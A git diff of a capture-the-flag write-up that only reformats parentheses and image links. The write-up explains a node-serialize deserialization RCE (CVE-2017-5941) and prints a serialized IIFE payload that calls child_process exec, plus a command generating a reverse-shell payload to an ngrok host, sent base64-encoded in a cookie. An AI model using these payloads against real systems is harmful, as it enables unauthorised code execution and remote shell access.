@@ -33,7 +33,7 @@ app.post('/guest', function(req, res) {
  }
 ```
 
-There is a well-known deserialization vulnerability in node.js that leads to RCE \([CVE-2017-5941](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)\).
+There is a well-known deserialization vulnerability in node.js that leads to RCE ([CVE-2017-5941](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)).
 
 By passing a serialized object like the following into `serialize.unserialize()`, we can achieve RCE.
 
@@ -43,7 +43,7 @@ require('child_process').exec('ls /', function(error, stdout, stderr) {
 console.log(stdout) });\n }()"}
 ```
 
-This relies on JavaScript's Immediately Invoked Function Expression \(IIFE\): notice the IIFE bracket after the function expression:
+This relies on JavaScript's Immediately Invoked Function Expression (IIFE): notice the IIFE bracket after the function expression:
 
 ```javascript
 function (){ ... }()
@@ -53,7 +53,7 @@ Now, we can execute a reverse shell payload within the function that would be fi
 
 In my case: `python nodejsshell.py 2.tcp.ngrok.io 13755` allowed me to generate a reverse shell payload for my ngrok tunnel.
 
-![](../../.gitbook/assets/image%20%282%29.png)
+![](<../../.gitbook/assets/image (2).png>)
 
 Then, we can copy the output into the function body.
 
@@ -65,14 +65,13 @@ serialize.unserialize(payload);
 
 Once we tested that our payload works, we can encode the payload to base 64, and send it through the cookie header.
 
-![](../../.gitbook/assets/image%20%286%29.png)
+![](<../../.gitbook/assets/image (3).png>)
 
 We obtain a reverse shell, which allows us to read the flag.
 
-![](../../.gitbook/assets/image%20%283%29.png)
+![](<../../.gitbook/assets/image (4).png>)
 
 ## References:
 
 1. [https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)
 2. [https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)
-
